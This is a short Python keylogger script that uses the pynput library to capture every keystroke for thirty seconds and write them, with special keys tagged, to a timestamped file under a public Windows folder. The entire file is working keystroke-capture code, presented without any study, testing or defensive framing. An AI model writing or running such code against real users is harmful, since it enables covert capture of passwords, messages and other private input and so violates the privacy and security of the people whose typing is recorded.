from pynput.keyboard import Listener, Key
import time
import os
import pathlib
from datetime import datetime

# Set the duration for the keylogger to run (in seconds)
duration_in_seconds = 30

# Create a file to store the key data
filePath = r"C:\\Users\\Public\\Logs\\"
pathlib.Path(r'C:\\Users\\Public\\Logs\\KEYS').mkdir(parents=True, exist_ok=True)
klPath = filePath + 'KEYS\\'

now = datetime.now()
fileName = f"KEYS_Info_{now.strftime('%Y-%m-%d_%H-%M-%S')}.txt"
filePath_ = os.path.join(klPath, fileName)


def on_press(key):
    with open(filePath_, 'a') as file:
        if hasattr(key, 'char'):
            file.write(key.char + ' ')
        elif key == Key.space:
            file.write('[space_key]' + ' ')
        elif key == Key.enter:
            file.write('[enter_key]' + ' ')
        elif key == Key.tab:
            file.write('[tab_key]' + ' ')
        else:
            file.write('[' + key.name + ']' + ' ')

# Record the start time
start_time = time.time()

with Listener(on_press=on_press) as listener:
    while (time.time() - start_time) < duration_in_seconds:
        pass  # This keeps the main thread alive

